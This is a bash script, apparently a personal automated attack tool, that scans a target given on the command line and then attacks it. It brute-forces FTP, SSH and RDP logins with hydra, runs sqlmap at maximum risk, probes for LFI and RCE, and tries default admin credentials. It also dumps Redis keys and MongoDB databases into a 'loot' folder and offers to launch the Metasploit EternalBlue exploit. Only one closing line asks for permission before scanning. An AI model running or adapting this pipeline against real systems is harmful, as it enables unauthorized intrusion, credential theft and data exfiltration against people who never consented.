#!/bin/bash

# Configuration
OUTPUT_DIR="/home/hacker2108/Desktop/tools/nmap_scans"
EXPLOIT_DIR="/home/hacker2108/Desktop/tools/exploits"
LOOT_DIR="/home/hacker2108/Desktop/tools/loot"
DATE=$(date +"%Y-%m-%d_%H-%M-%S")
TARGET="$1"
TARGET_NAME=$(echo "$TARGET" | tr '.' '_')
REPORT_FILE="$OUTPUT_DIR/${DATE}_${TARGET_NAME}_full_report.html"
THREADS=4  # Adjust based on your system
WORDLIST_DIR="/usr/share/wordlists"
SCAN_TIMEOUT="30m"  # Timeout for each scan

# Create directories if they don't exist
mkdir -p "$OUTPUT_DIR" "$EXPLOIT_DIR" "$LOOT_DIR"

# Check if target is provided
if [ -z "$TARGET" ]; then
    echo "Usage: $0 <target_ip_or_domain>"
    exit 1
fi

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
MAGENTA='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# Banner
echo -e "${BLUE}
   _____ _____ _____ _____ 
  |     |     |     |     |
  | N   | M   | A   | P   |
  |_____|_____|_____|_____|
  |                       |
  | Ultimate Auto-Scanner |
  |  ${RED}v2.0${BLUE}    |
  |_______________________|
${NC}"

echo -e "${CYAN}[+] Target: ${YELLOW}$TARGET${NC}"
echo -e "${CYAN}[+] Output Directory: ${YELLOW}$OUTPUT_DIR${NC}"
echo -e "${CYAN}[+] Exploit Directory: ${YELLOW}$EXPLOIT_DIR${NC}"
echo -e "${CYAN}[+] Loot Directory: ${YELLOW}$LOOT_DIR${NC}"
echo -e "${CYAN}[+] Scan Started: ${YELLOW}$DATE${NC}\n"

# Initialize HTML report
initialize_report() {
    cat <<EOF > "$REPORT_FILE"
<html>
<head>
    <title>Scan Report for $TARGET - $DATE</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; background-color: #f5f5f5; }
        .container { background-color: white; padding: 20px; border-radius: 5px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
        h1, h2, h3 { color: #333; }
        .scan-section { margin-bottom: 30px; border-bottom: 1px solid #eee; padding-bottom: 20px; }
        .vulnerability { background-color: #fff4f4; padding: 10px; border-left: 3px solid #e74c3c; margin: 10px 0; }
        .info { background-color: #f0f7ff; padding: 10px; border-left: 3px solid #3498db; margin: 10px 0; }
        .success { background-color: #f0fff4; padding: 10px; border-left: 3px solid #2ecc71; margin: 10px 0; }
        pre { background-color: #f8f8f8; padding: 10px; border-radius: 3px; overflow-x: auto; }
        .critical { color: #e74c3c; font-weight: bold; }
        .warning { color: #f39c12; }
        .low { color: #f1c40f; }
    </style>
</head>
<body>
<div class="container">
    <h1>Scan Report for $TARGET</h1>
    <p>Scan performed on: $DATE</p>
EOF
}

# Add section to report
add_report_section() {
    local title=$1
    local content=$2
    local class=$3
    
    echo "<div class='scan-section'>" >> "$REPORT_FILE"
    echo "<h2>$title</h2>" >> "$REPORT_FILE"
    echo "<div class='$class'>" >> "$REPORT_FILE"
    echo "<pre>$content</pre>" >> "$REPORT_FILE"
    echo "</div></div>" >> "$REPORT_FILE"
}

# Finalize report
finalize_report() {
    echo "</div></body></html>" >> "$REPORT_FILE"
}

# Function to run nmap scan and save results
run_nmap_scan() {
    local scan_type=$1
    local scan_name=$2
    local scan_options=$3
    local output_file="$OUTPUT_DIR/${DATE}_${TARGET_NAME}_${scan_name}"
    
    echo -e "\n${BLUE}[*] Running $scan_name scan...${NC}"
    echo -e "${YELLOW}Command: nmap $scan_options -oA \"$output_file\" \"$TARGET\"${NC}"
    
    timeout "$SCAN_TIMEOUT" nmap $scan_options -oA "$output_file" "$TARGET"
    
    # Convert XML to HTML for readability
    if [ -f "${output_file}.xml" ]; then
        xsltproc "${output_file}.xml" -o "${output_file}.html"
        
        # Add to report
        local scan_results=$(grep -v "<?xml" "${output_file}.nmap" | sed 's/</\&lt;/g; s/>/\&gt;/g')
        add_report_section "$scan_name Scan Results" "$scan_results" "info"
    else
        echo -e "${RED}[!] Scan $scan_name failed to produce XML output${NC}"
    fi
    
    echo -e "${GREEN}[+] $scan_name results saved to ${output_file}.*${NC}"
    
    # Check for vulnerabilities
    check_vulnerabilities "${output_file}.xml"
}

# Enhanced vulnerability checks
check_vulnerabilities() {
    local xml_file=$1
    
    # Check for open ports
    OPEN_PORTS=$(xmlstarlet sel -t -v "//port/state[@state='open']/../@portid" "$xml_file" | tr '\n' ',')
    if [ -z "$OPEN_PORTS" ]; then
        echo -e "${YELLOW}[!] No open ports found${NC}"
        add_report_section "Vulnerability Analysis" "No open ports found" "info"
        return
    fi
    
    echo -e "\n${MAGENTA}[*] Analyzing vulnerabilities on ports: ${OPEN_PORTS%,}${NC}"
    add_report_section "Open Ports" "The following ports are open: ${OPEN_PORTS%,}" "info"
    
    # Run enhanced vulnerability checks
    check_http_vulns "$xml_file"
    check_smb_vulns "$xml_file"
    check_ftp_vulns "$xml_file"
    check_ssh_vulns "$xml_file"
    check_rdp_vulns "$xml_file"
    check_dns_vulns "$xml_file"
    check_snmp_vulns "$xml_file"
    check_redis_vulns "$xml_file"
    check_mongodb_vulns "$xml_file"
    
    # Run automated exploit checks
    run_automated_exploit_checks "$xml_file"
}

# Enhanced HTTP vulnerability checks
check_http_vulns() {
    local xml_file=$1
    local http_ports=$(xmlstarlet sel -t -v "//port[service/@name='http' or service/@name='https' or service/@name='http-proxy']/@portid" "$xml_file" | tr '\n' ' ')
    
    for port in $http_ports; do
        local scheme="http"
        if xmlstarlet sel -t -v "//port[@portid='$port']/service/@name" "$xml_file" | grep -q "https"; then
            scheme="https"
        fi
        
        echo -e "\n${MAGENTA}[+] Checking HTTP(S) vulnerabilities on port $port (${scheme})${NC}"
        
        # Run Nikto scan
        echo -e "${CYAN}[*] Running Nikto scan...${NC}"
        timeout "$SCAN_TIMEOUT" nikto -host "$TARGET:$port" -ssl "$([ "$scheme" = "https" ] && echo "-ssl")" -output "$EXPLOIT_DIR/${DATE}_${TARGET_NAME}_nikto_$port.html" -Format htm
        
        # Run WhatWeb for technology detection
        echo -e "${CYAN}[*] Running WhatWeb...${NC}"
        whatweb -a 3 "$scheme://$TARGET:$port" --log-verbose="$EXPLOIT_DIR/${DATE}_${TARGET_NAME}_whatweb_$port.txt"
        
        # Check for common web vulnerabilities
        check_sql_injection "$TARGET" "$port" "$scheme"
        check_xss "$TARGET" "$port" "$scheme"
        check_lfi "$TARGET" "$port" "$scheme"
        check_rce "$TARGET" "$port" "$scheme"
        
        # Run directory brute-force
        echo -e "${CYAN}[*] Running directory brute-force...${NC}"
        gobuster dir -u "$scheme://$TARGET:$port" -w "$WORDLIST_DIR/dirb/common.txt" -t "$THREADS" -o "$EXPLOIT_DIR/${DATE}_${TARGET_NAME}_gobuster_$port.txt"
        
        # Check for default credentials
        check_default_creds "$TARGET" "$port" "$scheme"
    done
}

# Enhanced SMB vulnerability checks
check_smb_vulns() {
    local xml_file=$1
    local smb_ports=$(xmlstarlet sel -t -v "//port[service/@name='microsoft-ds' or service/@name='netbios-ssn']/@portid" "$xml_file")
    
    if [ -n "$smb_ports" ]; then
        echo -e "\n${MAGENTA}[+] Checking SMB vulnerabilities${NC}"
        
        # Run enum4linux
        echo -e "${CYAN}[*] Running enum4linux...${NC}"
        timeout "$SCAN_TIMEOUT" enum4linux -a "$TARGET" > "$EXPLOIT_DIR/${DATE}_${TARGET_NAME}_enum4linux.txt"
        
        # Run CrackMapExec
        if command -v crackmapexec &> /dev/null; then
            echo -e "${CYAN}[*] Running CrackMapExec...${NC}"
            timeout "$SCAN_TIMEOUT" crackmapexec smb "$TARGET" > "$EXPLOIT_DIR/${DATE}_${TARGET_NAME}_crackmapexec.txt"
        fi
        
        # Check for EternalBlue
        if grep -q "MS17-010" "$xml_file"; then
            echo -e "${RED}[!] POTENTIAL VULNERABILITY: MS17-010 (EternalBlue) detected${NC}"
            add_report_section "SMB Vulnerability" "MS17-010 (EternalBlue) detected" "vulnerability"
            
            echo "Attempting to verify vulnerability..."
            msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS $TARGET; check; exit" > "$EXPLOIT_DIR/${DATE}_${TARGET_NAME}_eternalblue_check.txt"
            
            if grep -q "is vulnerable" "$EXPLOIT_DIR/${DATE}_${TARGET_NAME}_eternalblue_check.txt"; then
                echo -e "${RED}[!] CONFIRMED: System is vulnerable to EternalBlue${NC}"
                add_report_section "SMB Vulnerability" "CONFIRMED: System is vulnerable to EternalBlue" "vulnerability"
                
                echo "Would you like to attempt exploitation? (y/n)"
                read -r answer
                if [ "$answer" = "y" ]; then
                    echo "Starting Metasploit EternalBlue exploit..."
                    msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS $TARGET; exploit"
                fi
            fi
        fi
        
        # Check for SMB signing
        echo -e "${CYAN}[*] Checking SMB signing...${NC}"
        nmap --script smb2-security-mode -p "$smb_ports" "$TARGET" > "$EXPLOIT_DIR/${DATE}_${TARGET_NAME}_smb_signing.txt"
        
        # Check for anonymous access
        echo -e "${CYAN}[*] Checking for anonymous access...${NC}"
        smbclient -L "//$TARGET" -N > "$EXPLOIT_DIR/${DATE}_${TARGET_NAME}_smb_anonymous.txt"
    fi
}

# Enhanced FTP vulnerability checks
check_ftp_vulns() {
    local xml_file=$1
    local ftp_ports=$(xmlstarlet sel -t -v "//port[service/@name='ftp']/@portid" "$xml_file")
    
    if [ -n "$ftp_ports" ]; then
        echo -e "\n${MAGENTA}[+] Checking FTP vulnerabilities${NC}"
        
        # Check for anonymous login
        echo -e "${CYAN}[*] Checking for anonymous FTP login...${NC}"
        {
            echo "quote USER anonymous"
            echo "quote PASS anonymous@example.com"
            echo "quit"
        } | timeout 30 ftp -n "$TARGET" > "$EXPLOIT_DIR/${DATE}_${TARGET_NAME}_ftp_anonymous_check.txt"
        
        if grep -q "230" "$EXPLOIT_DIR/${DATE}_${TARGET_NAME}_ftp_anonymous_check.txt"; then
            echo -e "${RED}[!] VULNERABILITY: Anonymous FTP login allowed${NC}"
            add_report_section "FTP Vulnerability" "Anonymous FTP login allowed" "vulnerability"
        fi
        
        # Check for vsftpd backdoor
        ftp_version=$(xmlstarlet sel -t -v "//port[@portid='$ftp_ports']/service/@version" "$xml_file")
        if [[ "$ftp_version" == *"vsftpd"* && "$ftp_version" == *"2.3.4"* ]]; then
            echo -e "${RED}[!] VULNERABILITY: Potential vsftpd 2.3.4 backdoor${NC}"
            add_report_section "FTP Vulnerability" "Potential vsftpd 2.3.4 backdoor detected" "vulnerability"
        fi
        
        # Run ftp brute-force
        echo -e "${CYAN}[*] Running FTP brute-force...${NC}"
        hydra -L "$WORDLIST_DIR/metasploit/common_users.txt" -P "$WORDLIST_DIR/metasploit/common_passwords.txt" -t "$THREADS" -f "$TARGET" ftp -o "$EXPLOIT_DIR/${DATE}_${TARGET_NAME}_ftp_bruteforce.txt"
    fi
}

# Enhanced SSH vulnerability checks
check_ssh_vulns() {
    local xml_file=$1
    local ssh_ports=$(xmlstarlet sel -t -v "//port[service/@name='ssh']/@portid" "$xml_file")
    
    if [ -n "$ssh_ports" ]; then
        echo -e "\n${MAGENTA}[+] Checking SSH vulnerabilities${NC}"
        
        # Get SSH version
        ssh_version=$(xmlstarlet sel -t -v "//port[@portid='$ssh_ports']/service/@version" "$xml_file")
        echo "SSH version: $ssh_version" > "$EXPLOIT_DIR/${DATE}_${TARGET_NAME}_ssh_info.txt"
        
        # Check for weak algorithms
        echo -e "${CYAN}[*] Checking for weak SSH algorithms...${NC}"
        nmap --script ssh2-enum-algos -p "$ssh_ports" "$TARGET" >> "$EXPLOIT_DIR/${DATE}_${TARGET_NAME}_ssh_info.txt"
        
        # Check for common vulnerabilities
        if [[ "$ssh_version" == *"7.2"* || "$ssh_version" == *"7.4"* ]]; then
            echo -e "${YELLOW}[!] WARNING: Potential vulnerabilities in OpenSSH $ssh_version${NC}"
            add_report_section "SSH Warning" "Potential vulnerabilities in OpenSSH $ssh_version" "warning"
        fi
        
        # Run SSH brute-force
        echo -e "${CYAN}[*] Running SSH brute-force...${NC}"
        hydra -L "$WORDLIST_DIR/metasploit/common_users.txt" -P "$WORDLIST_DIR/metasploit/common_passwords.txt" -t "$THREADS" -f -s "$ssh_ports" "$TARGET" ssh -o "$EXPLOIT_DIR/${DATE}_${TARGET_NAME}_ssh_bruteforce.txt"
        
        # Check for SSH public keys
        echo -e "${CYAN}[*] Checking for SSH public keys...${NC}"
        ssh-keyscan -p "$ssh_ports" "$TARGET" > "$LOOT_DIR/${DATE}_${TARGET_NAME}_ssh_keys.txt" 2>/dev/null
    fi
}

# RDP vulnerability checks
check_rdp_vulns() {
    local xml_file=$1
    local rdp_ports=$(xmlstarlet sel -t -v "//port[service/@name='ms-wbt-server']/@portid" "$xml_file")
    
    if [ -n "$rdp_ports" ]; then
        echo -e "\n${MAGENTA}[+] Checking RDP vulnerabilities${NC}"
        
        # Check for BlueKeep (CVE-2019-0708)
        echo -e "${CYAN}[*] Checking for BlueKeep vulnerability...${NC}"
        nmap --script rdp-vuln-ms19-010 -p "$rdp_ports" "$TARGET" > "$EXPLOIT_DIR/${DATE}_${TARGET_NAME}_rdp_bluekeep_check.txt"
        
        if grep -q "VULNERABLE" "$EXPLOIT_DIR/${DATE}_${TARGET_NAME}_rdp_bluekeep_check.txt"; then
            echo -e "${RED}[!] VULNERABILITY: BlueKeep (CVE-2019-0708) detected${NC}"
            add_report_section "RDP Vulnerability" "BlueKeep (CVE-2019-0708) detected" "vulnerability"
        fi
        
        # Run RDP brute-force
        echo -e "${CYAN}[*] Running RDP brute-force...${NC}"
        hydra -L "$WORDLIST_DIR/metasploit/common_users.txt" -P "$WORDLIST_DIR/metasploit/common_passwords.txt" -t "$THREADS" -f -s "$rdp_ports" "$TARGET" rdp -o "$EXPLOIT_DIR/${DATE}_${TARGET_NAME}_rdp_bruteforce.txt"
    fi
}

# DNS vulnerability checks
check_dns_vulns() {
    local xml_file=$1
    local dns_ports=$(xmlstarlet sel -t -v "//port[service/@name='domain']/@portid" "$xml_file")
    
    if [ -n "$dns_ports" ]; then
        echo -e "\n${MAGENTA}[+] Checking DNS vulnerabilities${NC}"
        
        # Run DNS enumeration
        echo -e "${CYAN}[*] Running DNS enumeration...${NC}"
        dnsenum "$TARGET" > "$EXPLOIT_DIR/${DATE}_${TARGET_NAME}_dns_enum.txt"
        
        # Check for zone transfers
        echo -e "${CYAN}[*] Checking for DNS zone transfers...${NC}"
        dig axfr "@$TARGET" "$TARGET" > "$EXPLOIT_DIR/${DATE}_${TARGET_NAME}_dns_zone_transfer.txt"
        
        if grep -q "XFR size" "$EXPLOIT_DIR/${DATE}_${TARGET_NAME}_dns_zone_transfer.txt"; then
            echo -e "${RED}[!] VULNERABILITY: DNS zone transfer allowed${NC}"
            add_report_section "DNS Vulnerability" "DNS zone transfer allowed" "vulnerability"
        fi
    fi
}

# SNMP vulnerability checks
check_snmp_vulns() {
    local xml_file=$1
    local snmp_ports=$(xmlstarlet sel -t -v "//port[service/@name='snmp']/@portid" "$xml_file")
    
    if [ -n "$snmp_ports" ]; then
        echo -e "\n${MAGENTA}[+] Checking SNMP vulnerabilities${NC}"
        
        # Run SNMP walk
        echo -e "${CYAN}[*] Running SNMP walk...${NC}"
        snmpwalk -c public -v1 "$TARGET" > "$EXPLOIT_DIR/${DATE}_${TARGET_NAME}_snmp_walk.txt"
        
        # Check for common community strings
        echo -e "${CYAN}[*] Checking for common community strings...${NC}"
        onesixtyone "$TARGET" -c "$WORDLIST_DIR/snmp/common_community.txt" > "$EXPLOIT_DIR/${DATE}_${TARGET_NAME}_snmp_community.txt"
        
        # Check for sensitive information
        if grep -q -i "password\|user\|login" "$EXPLOIT_DIR/${DATE}_${TARGET_NAME}_snmp_walk.txt"; then
            echo -e "${RED}[!] VULNERABILITY: Sensitive information exposed via SNMP${NC}"
            add_report_section "SNMP Vulnerability" "Sensitive information exposed via SNMP" "vulnerability"
        fi
    fi
}

# Redis vulnerability checks
check_redis_vulns() {
    local xml_file=$1
    local redis_ports=$(xmlstarlet sel -t -v "//port[service/@name='redis']/@portid" "$xml_file")
    
    if [ -n "$redis_ports" ]; then
        echo -e "\n${MAGENTA}[+] Checking Redis vulnerabilities${NC}"
        
        # Check for unauthorized access
        echo -e "${CYAN}[*] Checking for unauthorized Redis access...${NC}"
        redis-cli -h "$TARGET" INFO > "$EXPLOIT_DIR/${DATE}_${TARGET_NAME}_redis_info.txt" 2>&1
        
        if ! grep -q "NOAUTH" "$EXPLOIT_DIR/${DATE}_${TARGET_NAME}_redis_info.txt"; then
            echo -e "${RED}[!] VULNERABILITY: Redis server allows unauthorized access${NC}"
            add_report_section "Redis Vulnerability" "Redis server allows unauthorized access" "vulnerability"
            
            # Attempt to dump keys
            echo -e "${CYAN}[*] Dumping Redis keys...${NC}"
            redis-cli -h "$TARGET" --scan > "$LOOT_DIR/${DATE}_${TARGET_NAME}_redis_keys.txt"
        fi
    fi
}

# MongoDB vulnerability checks
check_mongodb_vulns() {
    local xml_file=$1
    local mongodb_ports=$(xmlstarlet sel -t -v "//port[service/@name='mongodb']/@portid" "$xml_file")
    
    if [ -n "$mongodb_ports" ]; then
        echo -e "\n${MAGENTA}[+] Checking MongoDB vulnerabilities${NC}"
        
        # Check for unauthorized access
        echo -e "${CYAN}[*] Checking for unauthorized MongoDB access...${NC}"
        mongo --host "$TARGET" --eval "db.adminCommand('listDatabases')" > "$EXPLOIT_DIR/${DATE}_${TARGET_NAME}_mongodb_info.txt" 2>&1
        
        if ! grep -q "Authentication failed" "$EXPLOIT_DIR/${DATE}_${TARGET_NAME}_mongodb_info.txt"; then
            echo -e "${RED}[!] VULNERABILITY: MongoDB server allows unauthorized access${NC}"
            add_report_section "MongoDB Vulnerability" "MongoDB server allows unauthorized access" "vulnerability"
            
            # Attempt to list databases
            echo -e "${CYAN}[*] Listing MongoDB databases...${NC}"
            mongo --host "$TARGET" --eval "db.getMongo().getDBNames()" > "$LOOT_DIR/${DATE}_${TARGET_NAME}_mongodb_databases.txt"
        fi
    fi
}

# SQL Injection check
check_sql_injection() {
    local target=$1
    local port=$2
    local scheme=$3
    
    echo -e "${CYAN}[*] Checking for SQL injection vulnerabilities...${NC}"
    sqlmap -u "$scheme://$target:$port/" --batch --crawl=1 --level=3 --risk=3 --output-dir="$EXPLOIT_DIR/${DATE}_${TARGET_NAME}_sqlmap" > "$EXPLOIT_DIR/${DATE}_${TARGET_NAME}_sqlmap.log"
    
    if grep -q "sqlmap identified the following injection point" "$EXPLOIT_DIR/${DATE}_${TARGET_NAME}_sqlmap.log"; then
        echo -e "${RED}[!] VULNERABILITY: SQL Injection found${NC}"
        local sqlmap_results=$(grep -A 20 "sqlmap identified the following injection point" "$EXPLOIT_DIR/${DATE}_${TARGET_NAME}_sqlmap.log")
        add_report_section "SQL Injection Vulnerability" "$sqlmap_results" "vulnerability"
    fi
}

# XSS check
check_xss() {
    local target=$1
    local port=$2
    local scheme=$3
    
    echo -e "${CYAN}[*] Checking for XSS vulnerabilities...${NC}"
    if [ -f "/opt/XSStrike/xsstrike.py" ]; then
        python3 /opt/XSStrike/xsstrike.py -u "$scheme://$target:$port/" --output "$EXPLOIT_DIR/${DATE}_${TARGET_NAME}_xss.txt"
        
        if [ -s "$EXPLOIT_DIR/${DATE}_${TARGET_NAME}_xss.txt" ]; then
            echo -e "${RED}[!] VULNERABILITY: XSS found${NC}"
            local xss_results=$(cat "$EXPLOIT_DIR/${DATE}_${TARGET_NAME}_xss.txt")
            add_report_section "XSS Vulnerability" "$xss_results" "vulnerability"
        fi
    else
        echo -e "${YELLOW}[!] XSStrike not found, skipping XSS check${NC}"
    fi
}

# LFI check
check_lfi() {
    local target=$1
    local port=$2
    local scheme=$3
    
    echo -e "${CYAN}[*] Checking for Local File Inclusion vulnerabilities...${NC}"
    lfi_tester="$scheme://$target:$port/index.php?page=../../../../../../etc/passwd"
    response=$(curl -s -o /dev/null -w "%{http_code}" "$lfi_tester")
    
    if [ "$response" == "200" ]; then
        echo -e "${RED}[!] VULNERABILITY: Potential LFI detected${NC}"
        add_report_section "LFI Vulnerability" "Potential Local File Inclusion detected at $lfi_tester" "vulnerability"
    fi
}

# RCE check
check_rce() {
    local target=$1
    local port=$2
    local scheme=$3
    
    echo -e "${CYAN}[*] Checking for Remote Code Execution vulnerabilities...${NC}"
    rce_tester="$scheme://$target:$port/index.php?cmd=whoami"
    response=$(curl -s "$rce_tester")
    
    if echo "$response" | grep -q -E "(root|admin|www-data)"; then
        echo -e "${RED}[!] VULNERABILITY: Potential RCE detected${NC}"
        add_report_section "RCE Vulnerability" "Potential Remote Code Execution detected at $rce_tester" "vulnerability"
    fi
}

# Default credentials check
check_default_creds() {
    local target=$1
    local port=$2
    local scheme=$3
    
    echo -e "${CYAN}[*] Checking for default credentials...${NC}"
    
    # Check for common admin interfaces
    admin_paths=("/admin" "/login" "/manager" "/wp-login.php" "/administrator")
    for path in "${admin_paths[@]}"; do
        url="$scheme://$target:$port$path"
        response=$(curl -s -o /dev/null -w "%{http_code}" "$url")
        
        if [ "$response" == "200" ]; then
            echo -e "${YELLOW}[!] Found admin interface at $url${NC}"
            add_report_section "Admin Interface" "Found admin interface at $url" "info"
            
            # Try default credentials
            default_creds=("admin:admin" "admin:password" "root:root" "guest:guest")
            for cred in "${default_creds[@]}"; do
                username=$(echo "$cred" | cut -d':' -f1)
                password=$(echo "$cred" | cut -d':' -f2)
                
                # Try POST login
                login_response=$(curl -s -X POST -d "username=$username&password=$password" "$url")
                
                if ! echo "$login_response" | grep -q -E "(invalid|error|incorrect)"; then
                    echo -e "${RED}[!] POSSIBLE DEFAULT CREDENTIALS: $username:$password worked at $url${NC}"
                    add_report_section "Default Credentials" "Possible default credentials $username:$password worked at $url" "vulnerability"
                    break
                fi
            done
        fi
    done
}

# Run automated exploit checks
run_automated_exploit_checks() {
    local xml_file=$1
    
    echo -e "\n${MAGENTA}[+] Running automated exploit checks${NC}"
    
    # Check for known vulnerabilities using nmap NSE
    echo -e "${CYAN}[*] Running vulnerability checks...${NC}"
    nmap --script vuln -oX "$OUTPUT_DIR/${DATE}_${TARGET_NAME}_vuln_check.xml" "$TARGET"
    xsltproc "$OUTPUT_DIR/${DATE}_${TARGET_NAME}_vuln_check.xml" -o "$OUTPUT_DIR/${DATE}_${TARGET_NAME}_vuln_check.html"
    
    # Check Metasploit for matching exploits
    if command -v msfconsole &> /dev/null; then
        echo -e "${CYAN}[*] Checking Metasploit for matching exploits...${NC}"
        msfconsole -q -x "db_import $xml_file; hosts; vulns; services; exit" > "$EXPLOIT_DIR/${DATE}_${TARGET_NAME}_metasploit_import.txt"
    fi
}

# Main scan execution
initialize_report

# Run different types of nmap scans in parallel when possible
echo -e "${CYAN}[*] Starting parallel scans...${NC}"

# Quick scan first to identify open ports quickly
run_nmap_scan "Quick Scan" "quick_scan" "-T4 --top-ports 100" &

# Full port scan in background (takes longer)
run_nmap_scan "Full Port Scan" "full_port_scan" "-p- -T4" &

# Service detection scan
run_nmap_scan "Service Detection" "service_scan" "-sV -T4 -O --version-all" &

# Vulnerability scan
run_nmap_scan "Vulnerability Scan" "vuln_scan" "--script vuln" &

# Wait for all background scans to complete
wait

# Run UDP scan if no vulnerabilities found in TCP
if ! grep -r -q "VULNERABILITY" "$EXPLOIT_DIR"; then
    run_nmap_scan "UDP Scan" "udp_scan" "-sU -T4 --top-ports 100"
fi

# Finalize the report
finalize_report

echo -e "\n${GREEN}[+] All scans completed!${NC}"
echo -e "${YELLOW}[+] Scan results saved to: $OUTPUT_DIR${NC}"
echo -e "${YELLOW}[+] Exploit information saved to: $EXPLOIT_DIR${NC}"
echo -e "${YELLOW}[+] Loot saved to: $LOOT_DIR${NC}"
echo -e "${GREEN}[+] HTML report generated: $REPORT_FILE${NC}"

# Generate summary
echo -e "\n${MAGENTA}=== SCAN SUMMARY ===${NC}"
echo -e "${CYAN}Target:${NC} $TARGET"
echo -e "${CYAN}Scan time:${NC} $DATE"
echo -e "${CYAN}Total files generated:${NC}"
find "$OUTPUT_DIR" "$EXPLOIT_DIR" "$LOOT_DIR" -type f -newer "$OUTPUT_DIR/${DATE}_${TARGET_NAME}_quick_scan.xml" | wc -l

echo -e "\n${MAGENTA}=== VULNERABILITIES FOUND ===${NC}"
grep -r -i "vulnerability" "$EXPLOIT_DIR" || echo "No critical vulnerabilities found"

echo -e "\n${MAGENTA}=== RECOMMENDED NEXT STEPS ===${NC}"
echo "1. Review the full HTML report: $REPORT_FILE"
echo "2. Check exploit attempts in: $EXPLOIT_DIR"
echo "3. Examine loot in: $LOOT_DIR"
echo "4. For confirmed vulnerabilities, consider manual verification"
echo -e "\n${RED}Remember: Only test on systems you have permission to scan!${NC}"
